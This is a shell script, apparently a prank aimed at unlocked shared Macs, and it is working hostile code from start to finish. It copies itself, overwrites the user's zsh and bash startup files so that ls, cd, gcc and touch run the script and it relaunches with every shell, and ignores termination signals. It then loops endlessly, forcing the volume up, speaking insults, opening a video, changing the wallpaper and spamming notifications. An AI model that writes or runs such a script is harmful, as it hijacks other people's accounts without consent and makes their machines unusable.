echo "$(cat $0)" > ~/Applications/ouai.sh
chmod a+rx ~/Applications/ouai.sh

echo "$(cat ~/.zshrc)" > ~/.zshrc_save
echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" > ~/.zshrc
echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
echo "~/Applications/ouai.sh" >> ~/.zshrc
echo "$(cat ~/.zshrc_save)" >> ~/.zshrc
echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
echo "~/Applications/ouai.sh" >> ~/.zshrc
rm ~/.zshrc_save
source ~/.zshrc

if [ -f ~/.bashrc ]; then
	echo "$(cat ~/.bashrc)" > ~/.bashrc_save
	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" > ~/.bashrc
	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
	echo "~/Applications/ouai.sh" >> ~/.bashrc
	echo "$(cat ~/.bashrc_save)" >> ~/.bashrc
	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
	echo "~/Applications/ouai.sh" >> ~/.bashrc
	rm ~/.bashrc_save
	source ~/.bashrc
fi

if [ -f ~/.bash_profile ]; then
	echo "$(cat ~/.bash_profile)" > ~/.bash_profile_save
	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" > ~/.bash_profile
	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
	echo "~/Applications/ouai.sh" >> ~/.bash_profile
	echo "$(cat ~/.bash_profile_save)" >> ~/.bash_profile
	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
	echo "~/Applications/ouai.sh" >> ~/.bash_profile
	rm ~/.bash_profile_save
	source ~/.bash_profile
fi

pic="/sgoinfre/goinfre/Misc/bisounours/HAPPYTHREEFIRENDS.jpg"
video="https://www.youtube.com/watch?v=dQw4w9WgXcQ"
ouai="Lock your screen noob."
j=0

echo "\033(0"
osascript -e "set Volume 10"
osascript -e "tell app \"System Events\" to display dialog \"Regle numero 1 Lock Screen\"" > Trolled
open ${video}
trap 'clear ; echo "Oui... Mais non." ; sleep 1' 1 2 3 6 9 15
while [ 1 ]
do
	say "Lock your screen bitch"
	osascript -e 'tell application "Terminal" to do script "telnet nyancat.dakko.us"'
	osascript -e "tell application \"Finder\" to set desktop picture to POSIX file \"${pic}\""
	osascript -e "display notification \"Il faut lock son mac\" with title \"Tu t'es fait ken\" sound name \"Tink\""
	j=`expr $j + 1`
	osascript -e "set Volume 10"
	if [ $j -eq 5 ]
	then
		j=0
		open ${video}
	fi
	for i in {1..15} {17..231} {235..256}
	do
		echo "\x1b[7m\033[38;5;${i}m ${ouai} \033[0m\c"
	done
done
